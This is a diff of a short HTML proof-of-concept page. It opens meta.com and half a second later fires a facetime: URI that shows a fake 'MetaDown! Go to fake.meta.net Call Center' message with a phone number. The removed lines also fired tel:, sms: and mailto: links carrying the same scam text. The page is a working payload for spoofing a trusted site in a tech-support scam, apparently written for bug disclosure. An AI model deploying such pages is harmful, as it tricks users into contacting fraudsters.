@@ -1,35 +1,21 @@
-<!DOCTYPE html>
 <html>
 <body>
 <script>
-function openLegit() {
+function cc(){
   window.open("https://meta.com");
 }
-
-function triggerSchemes() {
-  const schemes = [
-    'facetime:meta.com says:%0a%0dMetaDown!%0aGo%20to%20fake.meta.net%20Call%20Center%0a%0dCall:0987-65432',
-    'tel:098765432',
-    'sms:098765432?body=MetaDown!%0AGo%20to%20fake.meta.net%20Call%20Center',
-    'mailto:support@fake.meta.net?subject=Meta%20Down&body=Please%20call%20098765432'
-  ];
-
-  schemes.forEach((href, i) => {
-    setTimeout(() => {
-      var a = document.createElement('a');
-      a.href = href;
-      a.click();
-      document.body.appendChild(a);
-    }, 500 * (i + 1));
-  });
+function bb(){
+  var link = document.createElement('a');
+  link.href = 'facetime:meta.com says:%0a%0dMetaDown!%0aGo%20to%20fake.meta.net%20Call%20Center%0a%0dCall:0987-65432';
+  link.click();
+  document.body.appendChild(link);
 }
-
-function runPoC() {
-  setTimeout(openLegit, 0);
-  setTimeout(triggerSchemes, 500);
+function aa(){
+  setTimeout('cc()','0');
+  setTimeout('bb()','500');
 }
 </script>
 
-<button onclick="runPoC()">Click me</button>
+<button onclick="aa()">Click me</button>
 </body>
 </html>
